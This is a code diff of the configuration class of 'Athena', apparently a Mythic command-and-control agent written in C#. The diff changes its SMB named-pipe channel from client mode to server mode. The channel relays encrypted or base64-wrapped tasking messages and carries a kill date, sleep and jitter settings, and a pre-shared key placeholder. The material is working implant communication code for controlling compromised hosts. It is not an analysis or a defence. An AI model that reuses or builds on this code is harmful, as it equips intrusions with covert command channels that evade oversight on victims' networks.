@@ -2,53 +2,48 @@
 using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
-using System.Collections.Generic;
 using System.IO;
 using System.IO.Pipes;
-using System.Net.WebSockets;
 using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
 
 namespace Athena.Config
 {
     public class MythicConfig
     {
-        public SmbClient currentConfig { get; set; }
+        public SmbServer currentConfig { get; set; }
         public string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public SmbServer smbConfig { get; set; }
+        public SmbClient smbConfig { get; set; }
 
         public MythicConfig()
         {
-            this.uuid = "35ce7904-ca99-4528-bfb8-22965945713a";
+            this.uuid = "%UUID%";
             this.killDate = DateTime.Parse("2022-08-25");
             int sleep = int.TryParse("0", out sleep) ? sleep : 60;
             this.sleep = sleep;
             int jitter = int.TryParse("0", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.currentConfig = new SmbClient(this.uuid, this);
-            this.smbConfig = new SmbServer();
+            this.currentConfig = new SmbServer(this.uuid, this);
+            this.smbConfig = new SmbClient();
         }
     }
 
-    public class SmbClient
+    public class SmbServer
     {
         public string psk { get; set; }
         public string callbackHost { get; set; }
         public string pipeName { get; set; }
-        public bool encryptedExchangeCheck { get; set; }
-        public NamedPipeClientStream pipeStream { get; set; }
-        public PSKCrypto crypt { get; set; }
-        //public string uuid { get; set; }
-        private string recv { get; set; }
-        private string send { get; set; }
-        private MythicConfig baseConfig { get; set; }
         public bool encrypted { get; set; }
+        public bool connected { get; set; }
+        public bool encryptedExchangeCheck { get; set; }
+        private MythicConfig baseConfig { get; set; }
+        private NamedPipeServerStream pipeStream { get; set; }
+        public PSKCrypto crypt { get; set; }
 
-        public SmbClient(string uuid, MythicConfig config)
+        public SmbServer(string uuid, MythicConfig config)
         {
             this.callbackHost = "%SERVER%";
             this.psk = "AESPSK";
@@ -62,70 +57,38 @@ namespace Athena.Config
                 this.encrypted = true;
             }
 
-            Task.Run(() => Connect(this.callbackHost, this.pipeName));
+            this.connected = Start(this.pipeName);
+
+            if (!this.connected)
+            {
+                Environment.Exit(0);
+            }
         }
 
-        public bool Connect(string host, string pipename)
+        private bool Start(string name)
         {
             try
             {
-                this.pipeStream = new NamedPipeClientStream
-                    (this.callbackHost, this.pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
-
-                //Should I add a timeout for this?
-                this.pipeStream.Connect();
-                try
-                {
-                    // Read user input and send that to the client process.
-                    using (BinaryWriter _bw = new BinaryWriter(pipeStream))
-                    using (BinaryReader _br = new BinaryReader(pipeStream))
-                    {
-                        while (true)
-                        {
-                            //Wait for a message to be ready to send.
-                            while (string.IsNullOrEmpty(this.send)) ;
-                            DelegateMessage msg = new DelegateMessage()
-                            {
-                                uuid = this.baseConfig.uuid,
-                                message = this.send,
-                                c2_profile = "smbclient"
-                            };
-                            this.send = "";
-
-                            var buf = Encoding.ASCII.GetBytes(JsonConvert.SerializeObject(msg));
-                            _bw.Write((uint)buf.Length);
-                            _bw.Write(buf);
-
-                            //Wait for response
-                            var len = _br.ReadUInt32();
-                            var temp = new string(_br.ReadChars((int)len));
-                            this.recv = temp;
-                        }
-                    }
-                }
-                // Catch the IOException that is raised if the pipe is broken
-                // or disconnected.
-                catch (IOException e)
-                {
-                    //It may be worth adding some "link" functioanlity
-                }
-                catch
-                {
-                    //Generic catches
-                }
+                this.pipeStream = new NamedPipeServerStream(name);
+                this.pipeStream.WaitForConnection();
                 return true;
             }
-            catch (Exception e)
+            catch
             {
                 return false;
             }
         }
 
+        //Send, wait for a response, and return it to the main functions
         public async Task<string> Send(object obj)
         {
+            if (!connected)
+            {
+                //Initiate a new connection
+                this.Start(this.pipeName);
+            }
             try
             {
-                this.recv = "";
                 string json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
@@ -136,24 +99,70 @@ namespace Athena.Config
                     json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
 
-                this.send = json;
-
-                while (string.IsNullOrEmpty(this.recv)) ;
+                //Send message to pipe and get response
+                string res = this.SendToPipe(json);
 
                 if (this.encrypted)
                 {
-                    string retString = this.recv;
-                    return this.crypt.Decrypt(retString);
+                    return this.crypt.Decrypt(res);
                 }
                 else
                 {
-                    string retString = this.recv;
-                    return Misc.Base64Decode(retString).Substring(36);
+                    return Misc.Base64Decode(res).Substring(36);
                 }
             }
             catch
             {
                 return "";
+            }
+        }
+        private string SendToPipe(string json)
+        {
+            try
+            {
+                // Read user input and send that to the client process.
+                using (BinaryWriter _bw = new BinaryWriter(pipeStream))
+                using (BinaryReader _br = new BinaryReader(pipeStream))
+                {
+                    //Format the message
+                    DelegateMessage msg = new DelegateMessage()
+                    {
+                        uuid = this.baseConfig.uuid,
+                        message = json,
+                        c2_profile = "smbclient"
+                    };
+
+                    //Write to NamedPipe
+                    var buf = Encoding.ASCII.GetBytes(JsonConvert.SerializeObject(msg));
+                    _bw.Write((uint)buf.Length);
+                    _bw.Write(buf);
+
+                    //Wait for response from server
+                    buf = ReceiveFromNamedPipe();
+
+                    //Return the buffer as a string
+                    return Encoding.ASCII.GetString(buf);
+                }
+            }
+            catch
+            {
+                return "";
+            }
+        }
+        //Read from named pipe and return it as a byte array
+        private byte[] ReceiveFromNamedPipe()
+        {
+            byte[] buffer = new byte[1024];
+            using (var ms = new MemoryStream())
+            {
+                do
+                {
+                    var readBytes = this.pipeStream.Read(buffer, 0, buffer.Length);
+                    ms.Write(buffer, 0, readBytes);
+                }
+                while (!this.pipeStream.IsMessageComplete);
+
+                return ms.ToArray();
             }
         }
     }
